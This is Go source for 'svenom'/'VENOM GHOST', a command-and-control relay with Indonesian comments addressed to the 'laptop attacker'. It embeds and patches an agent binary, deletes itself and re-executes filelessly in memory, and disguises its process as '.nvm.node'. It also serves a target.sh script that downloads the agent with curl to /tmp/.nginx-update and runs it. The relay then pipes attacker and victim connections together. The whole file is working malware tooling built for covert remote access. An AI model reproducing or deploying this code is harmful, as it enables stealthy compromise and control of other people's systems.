package main

import (
	"bufio"
	"bytes"
	"crypto/rand"
	_ "embed"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"     // <-- tambahkan ini
	"strings"
	"sync"

	"github.com/blackopsbos/svenom/pkg/masquerade"
	"github.com/blackopsbos/svenom/pkg/memfd"
)

//go:embed agentbin/vghost
var agentTemplate []byte

var (
	installMode = flag.Bool("i", false, "Install relay server")
	relayMode   = flag.Bool("relay", false, "Run as relay server")
	domain      = flag.String("d", "", "Domain name (optional)")
	listenPort  = flag.String("port", "443", "Relay port")
	httpPort    = flag.String("http", "8080", "HTTP port for serving agent")
	secretFlag  = flag.String("secret", "", "Secret key (required for relay mode)")
)

const banner = `
██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗
██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║
██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
 ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
  ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
`

func main() {
	flag.Parse()

	if *relayMode {
		if *secretFlag == "" {
			log.Fatal("Secret required for relay mode")
		}
		runRelay(*listenPort, *httpPort, *secretFlag)
		return
	}

	if *installMode {
		installServer()
		return
	}

	fmt.Println(banner)
	fmt.Println("Usage: svenom -i [-d domain.com] [-port 443] [-http 8080]")
}

func installServer() {
	publicIP, _ := getPublicIP()
	serverDomain := *domain
	if serverDomain == "" {
		serverDomain = publicIP
	}

	secretBytes := make([]byte, 16)
	rand.Read(secretBytes)
	secret := hex.EncodeToString(secretBytes)

	absPath, _ := filepath.Abs(".")

	fmt.Println(banner)
	fmt.Println("(VENOM GHOST) ")
	fmt.Printf("IP Public Address Server : %s\n", publicIP)
	fmt.Printf("Domain Server            : %s\n", serverDomain)
	fmt.Printf("Path                     : %s\n", absPath)
	fmt.Printf("Secret Key               : %s\n", secret)
	fmt.Println()
	fmt.Println("Gunakan command berikut di LAPTOP ATTACKER setelah target terpasang:")
	fmt.Printf("   vghost --Sk %s -d %s --connect\n", secret, serverDomain)
	fmt.Println("\n[*] Starting fileless relay server...")

	self, _ := os.ReadFile(os.Args[0])
	os.Remove(os.Args[0])

	args := []string{
		".nvm.node",
		"-relay",
		"-listen", fmt.Sprintf(":%s", *listenPort),
		"-http", *httpPort,
		"-secret", secret,
	}
	if err := memfd.ExecuteInMemory(self, args, os.Environ()); err != nil {
		log.Printf("memfd failed, fallback: %v", err)
		masquerade.DisguiseAs(".nvm.node", "/usr/bin/.nvm.node -relay -listen "+*listenPort)
		runRelay(*listenPort, *httpPort, secret)
	}
}

func runRelay(listenPort, httpPort, secret string) {
	masquerade.DisguiseAs(".nvm.node", "/usr/bin/.nvm.node -relay -listen "+listenPort)

	publicIP, _ := getPublicIP()
	if publicIP == "" {
		publicIP = "127.0.0.1"
	}

	placeholderSecret := []byte("SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS")
	placeholderDomain := []byte("DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD")
	secretPadded := fmt.Sprintf("%-32s", secret)
	domainPadded := fmt.Sprintf("%-32s", publicIP)

	patchedBinary := bytes.Replace(agentTemplate, placeholderSecret, []byte(secretPadded), 1)
	patchedBinary = bytes.Replace(patchedBinary, placeholderDomain, []byte(domainPadded), 1)

	http.HandleFunc("/vghost", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Write(patchedBinary)
	})
	http.HandleFunc("/target.sh", func(w http.ResponseWriter, r *http.Request) {
		script := fmt.Sprintf(`#!/bin/bash
echo "[*] Mengunduh agent..."
curl -s http://%s:%s/vghost -o /tmp/.nginx-update && chmod +x /tmp/.nginx-update
echo "[*] Menjalankan agent..."
/tmp/.nginx-update &
sleep 1
echo ""
echo "(VENOM GHOST)"
echo "IP Public Address Server : %s"
echo "Domain Server            : %s"
echo "Path                     : /tmp"
echo "Secret Key               : %s"
echo ""
echo "Command untuk Attacker : vghost --Sk %s -d %s --connect"
`, publicIP, httpPort, publicIP, publicIP, secret, secret, publicIP)
		w.Header().Set("Content-Type", "text/plain")
		w.Write([]byte(script))
	})
	go http.ListenAndServe(":"+httpPort, nil)

	ln, err := net.Listen("tcp", ":"+listenPort)
	if err != nil {
		log.Fatalf("Relay listen: %v", err)
	}
	log.Printf("Relay listening on port %s", listenPort)

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Printf("Accept error: %v", err)
			continue
		}
		go handleConn(conn)
	}
}

func getPublicIP() (string, error) {
	resp, err := http.Get("https://ifconfig.me/ip")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return strings.TrimSpace(string(body)), nil
}

var waitingPeers = struct {
	sync.Mutex
	m map[string]net.Conn
}{m: make(map[string]net.Conn)}

func handleConn(conn net.Conn) {
	defer conn.Close()
	reader := bufio.NewReader(conn)
	secret, err := reader.ReadString('\n')
	if err != nil {
		return
	}
	secret = strings.TrimSpace(secret)

	waitingPeers.Lock()
	if peer, ok := waitingPeers.m[secret]; ok {
		delete(waitingPeers.m, secret)
		waitingPeers.Unlock()
		go io.Copy(peer, conn)
		io.Copy(conn, peer)
		peer.Close()
	} else {
		waitingPeers.m[secret] = conn
		waitingPeers.Unlock()
		defer func() {
			waitingPeers.Lock()
			delete(waitingPeers.m, secret)
			waitingPeers.Unlock()
		}()
		io.ReadAll(conn)
	}
}